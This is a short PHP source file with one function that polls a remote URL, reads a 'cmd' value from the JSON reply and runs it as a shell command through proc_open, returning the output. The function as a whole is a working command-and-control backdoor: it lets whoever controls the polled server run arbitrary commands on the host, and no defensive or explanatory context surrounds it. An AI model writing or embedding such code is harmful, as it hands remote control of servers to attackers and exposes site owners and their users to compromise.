<?php
function poll_for_tasks($url) {
  $ch = curl_init($url);
  curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
  $raw = curl_exec($ch);
  curl_close($ch);
  $resp = json_decode($raw, true);
  $cmd = (string) $resp["cmd"];
  $p = proc_open($cmd, array(1=>array("pipe","w")), $pipes); return stream_get_contents($pipes[1]);
}
